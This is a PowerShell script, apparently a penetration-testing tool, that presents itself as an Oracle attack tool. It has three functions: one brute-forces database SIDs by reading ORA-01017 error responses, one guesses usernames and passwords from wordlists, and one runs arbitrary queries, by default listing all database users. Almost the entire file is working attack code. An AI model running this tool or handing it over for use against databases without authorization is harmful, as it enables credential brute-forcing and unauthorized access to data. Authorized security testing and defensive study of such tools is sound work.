<#
.SYNOPSIS

Author: Andrew Bonstrom (@ch33kyf3ll0w)

.DESCRIPTION
An Oracle attack tool written in PowerShell and using the .NET OracleClient. Can be used to bruteforce SIDs, Username/Passwords, and to execute queries.
#>

function Invoke-SIDGuess {
<#
.DESCRIPTION
Attempts to connect to an Oracle TNSListener using a provided SID and reports whether or not the SID is valid. Accepts a single host and SID, or a list of SIDS/Hosts in a textfile seperated by a newline character.

.PARAMETER HostName
The host you wish to target.

.PARAMETER HostList
Path to .txt file containing hosts seperated by a newline character.

.PARAMETER HostPort
The Port of the targeted TNSListener.

.PARAMETER SID
The SID of the targeted TNSListener.

.PARAMETER SIDList
Path to .txt file containing SIDs seperated by a newline character.

.EXAMPLE
PS C:\> Invoke-SIDGuess -HostName 192.168.1.34 -HostPort 1521 -SID EPROD

.EXAMPLE
PS C:\> Invoke-SIDGuess  -HostList oracle_hosts.txt -Port 1521 -SIDList sidwordlist.txt

.REFERENCE
https://msdn.microsoft.com/en-us/library/system.data.oracleclient(v=vs.110).aspx
https://technet.microsoft.com/en-us/library/hh849914.aspx

#>

        #Assigning Args
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory = $false)]
        [string]$HostName,
		[Parameter(Mandatory = $false)]
        [string]$HostList,
        [Parameter(Mandatory = $True)]
        [string]$HostPort,   
        [Parameter(Mandatory = $false)]
        [string]$SID,
        [Parameter(Mandatory = $false)]
        [string]$SIDList
)

		#Initialize Arrays
		$sidWordList = @()
		$HostTargetList = @()
		
        #Loads .NET OracleClient Assembly
		Add-Type -AssemblyName System.Data.OracleClient

		#Assign SIDs to be targeted to an array
		if ($SIDList -like "*.txt*"){
			foreach($sid in Get-Content -Path $SIDList){
				$sidWordList += $sid
			}
		}
		else{
			$sidWordList += $SID
		}
		
		#Assign hosts to target to an array
		if ($HostList -like "*.txt*"){
			foreach($ip in Get-Content -Path $HostList){
				$HostTargetList += $ip
			}
		}
		else{
			$HostTargetList += $HostName
		}
		
		Write-Host "`nINFO: Now attempting to connect to the remote TNSListener......`n"
		
		foreach ($h in $HostTargetList){
			foreach ($s in $sidWordList){

				#Creates connection string to use for targeted TNSListener
				$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$h)(Port=$HostPort)))(CONNECT_DATA=(SID=$s)));"
				#Creates new object with oracle client .net class using created connection string
				$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
			
				try
				{
					#Attempts connection
					$conn.Open()
        
				}
				catch
				{
					#Assigns exception message to var
					$ErrorMessage = $_.Exception.Message
					#01017 is the ORA exception that implies failed username/password. Cannot get to this phase without valid SID, therefore the existence of 01017 implies correct SID
					if ($ErrorMessage -match "01017"){
						Write-Host -Object "[+] $s for the TNSListener at $h is valid!`n" -ForegroundColor 'green'
					}
					else{
						Write-Host  -Object "[-] $s is invalid for the TNSListener at $h.`n" -ForegroundColor 'red'
					}

				}
			#Close connection
			$conn.Close()
			}
		}
	}

function Invoke-CredentialGuess {
<#
.DESCRIPTION
Attempts to authenticate to an Oracle Database using provided credentials with a valid SID. Accepts either single Username/Password entries or a list of Usernames/Passwords in a textfile seperated by a newline character.

.PARAMETER HostName
The Host you wish to target.

.PARAMETER HostPort
The Port of the targeted TNSListener.

.PARAMETER SID
The SID of the targeted TNSListener.

.PARAMETER Username
The Username for an existing user.

.PARAMETER UsernameList
Path to .txt file containing usernames seperated by a newline character.

.PARAMETER Password
The password for an existing user.

.PARAMETER PasswordList
Path to .txt file containing passwords seperated by a newline character.

.EXAMPLE
PS C:\> Invoke-CredentialGuess -HostName 192.168.1.34 -HostPort 1521 -SID EPROD -Username bobby -Password joe

.EXAMPLE
PS C:\> Invoke-CredentialGuess -HostName 192.168.1.34 -Port 1521 -SID EPROD -UsernameList users.txt -PasswordList passwords.txt

.REFERENCES
https://msdn.microsoft.com/en-us/library/system.data.oracleclient(v=vs.110).aspx
https://technet.microsoft.com/en-us/library/hh849914.aspx

#>

        #Assigning Args
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory = $True)]
        [string]$HostName,
        [Parameter(Mandatory = $True)]
        [string]$HostPort,   
        [Parameter(Mandatory = $True)]
        [string]$SID,
        [Parameter(Mandatory = $false)]
        [string]$Username,
		[Parameter(Mandatory = $false)]
        [string]$UsernameList,
		[Parameter(Mandatory = $false)]
        [string]$Password,
        [Parameter(Mandatory = $false)]
        [string]$PasswordList
)
        #Loads .NET OracleClient Assembly
		Add-Type -AssemblyName System.Data.OracleClient
		
		#Initialize Arrays
		$UsernameWordList = @()
		$PasswordWordList = @()
		
		#Assign credentials to be used into arrays
		if ($UsernameList -like "*.txt*"){
			foreach($user in Get-Content -Path $UsernameList){
				$UsernameWordList += $user
			}
		}
		else{
			$UsernameWordList += $Username
		}
		
		#Assign hosts to target to an array
		if ($PasswordList -like "*.txt*"){
			foreach($pass in Get-Content -Path $PasswordList){
				$PasswordWordList += $pass
			}
		}
		else{
			$PasswordWordList += $Password
		}
		
		Write-Host "`nINFO: Now beginning credential guessing attempts......`n"
		
		foreach ($u in $UsernameWordList){
			foreach ($p in $PasswordWordList){
				#Creates connection string to use for targeted TNSListener
				$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$HostName)(Port=$HostPort)))(CONNECT_DATA=(SID=$SID)));User id=$u;Password=$p"
				#Creates new object with oracle client .net class using created connection string
				$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)

				try
				{
					$conn.Open()
					Write-Host  -Object "[+] The provided Username $u and Password $p were correct for $HostName!" -ForegroundColor 'green'
				}
				catch
				{
					#Assigns exception message to var
					$ErrorMessage = $_.Exception.Message
					#01017 is the ORA exception that implies failed username/password. 
					if ($ErrorMessage -match "01017"){
						Write-Host  -Object "`n[-] The provided Username $u and Password $p were incorrect for $HostName!`n" -ForegroundColor 'red'
					}
					else{
						Write-Host  -Object "`n[*] Connection Failed. Error: $ErrorMessage" -ForegroundColor 'red'
					}			
				}
			$conn.Close()
			}
		}

	}

function Invoke-QueryExec {

<#
.DESCRIPTION
Oracle PowerShell client that can be used to interface with a TNS Listener and the back end database to run queries.

.PARAMETER HostName
Host of the remote TNS Listener.

.PARAMETER HostPort
Port of the remote TNS Listener.

.PARAMETER SID
SID of the remote TNS Listener.

.PARAMETER Username
Username to authenticate against the remote Oracle DB.

.PARAMETER Password
Password to authenticate agains the remote Oracle DB.

.PARAMETER QueryString
Query to execute on the remote Oracle DB.

.EXAMPLE
PS C:\> Oracle-QueryExec  -Host 192.168.1.34 -Port 1521 -Sid EPROD -User SCOTT -Password TIGER -QueryString "SELECT * FROM TABLE"

.REFERENCES
https://msdn.microsoft.com/en-us/library/system.data.oracleclient(v=vs.110).aspx
https://technet.microsoft.com/en-us/library/hh849914.aspx
#>

	#Assigning Args
	[CmdletBinding()]
    		param(
        [Parameter(Mandatory = $True)]
        [string]$HostName,
        [Parameter(Mandatory = $True)]
        [string]$HostPort,
        [Parameter(Mandatory = $True)]
        [string]$SID,
        [Parameter(Mandatory = $True)]
        [string]$Username,
        [Parameter(Mandatory = $True)]
        [string]$Password,
        [Parameter(Mandatory = $false)]
        [string]$QueryString = "SELECT username FROM dba_users order by username"
    	)
		
	#Loads .NET OracleClient Assembly
	Add-Type -AssemblyName System.Data.OracleClient

	#Create connection string
	$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$HostName)(Port=$HostPort)))(CONNECT_DATA=(SID=$SID)));User id=$Username;Password=$Password"
	#Initiate connection to DB
	$conn = new-object System.Data.OracleClient.OracleConnection($connectionString)
	$command = new-Object System.Data.OracleClient.OracleCommand($QueryString, $conn)
	

	Write-Host "`nINFO: Now attempting to execute provided query......`n"
	Write-Host "Provided Query: $QueryString`n"
	Write-Host "Query Output:`n"
	
	try {
		#Open connection to DB
		$conn.Open()
		$reader = $command.ExecuteReader()
		while ($reader.Read()){
			Write-Host $reader.GetValue(0)
		}
		
	}
	catch {
		#Assigns exception message to var
		$ErrorMessage = $_.Exception.Message
		Write-Host  -Object "`n[*] Query execution Failed. Error: $ErrorMessage" -ForegroundColor 'red'						
	}
$conn.Close()
}
